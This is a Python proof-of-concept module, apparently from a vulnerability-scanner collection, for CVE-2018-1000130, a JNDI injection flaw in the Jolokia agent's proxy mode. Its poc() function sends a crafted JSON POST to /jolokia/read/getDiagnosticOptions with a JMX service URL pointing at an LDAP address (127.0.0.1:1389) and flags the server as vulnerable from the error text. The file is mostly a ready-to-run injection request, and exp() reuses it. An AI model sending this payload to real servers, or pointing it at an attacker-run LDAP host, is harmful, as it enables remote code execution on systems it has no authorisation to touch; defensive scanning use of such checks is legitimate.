import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Jolokia Agent Proxy JNDI Code Injection''',
        "description": '''A JNDI Injection vulnerability exists in Jolokia agent in the proxy mode that allows a remote attacker to run arbitrary Java code on the server.''',
        "severity": "high",
        "references": [
            "https://jolokia.org/#Security_fixes_with_1.5.0", 
            "https://access.redhat.com/errata/RHSA-2018:2669"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvss-score": "",
            "cve-id": "CVE-2018-1000130",
            "cwe-id": "CWE-74"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2018", "jolokia", "rce", "jndi", "proxy"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/jolokia/read/getDiagnosticOptions"""
        method = "POST"
        data = """{
   "type":"read",
   "mbean":"java.lang:type=Memory",
   "target":{
      "url":"service:jmx:rmi:///jndi/ldap://127.0.0.1:1389/o=tomcat"
   }
}"""
        headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.', 'Content-Type': 'application/x-www-form-urlencoded'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""Failed to retrieve RMIServer stub: javax.naming.CommunicationException: 127.0.0.1:1389""" in resp0.text) and (resp0.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url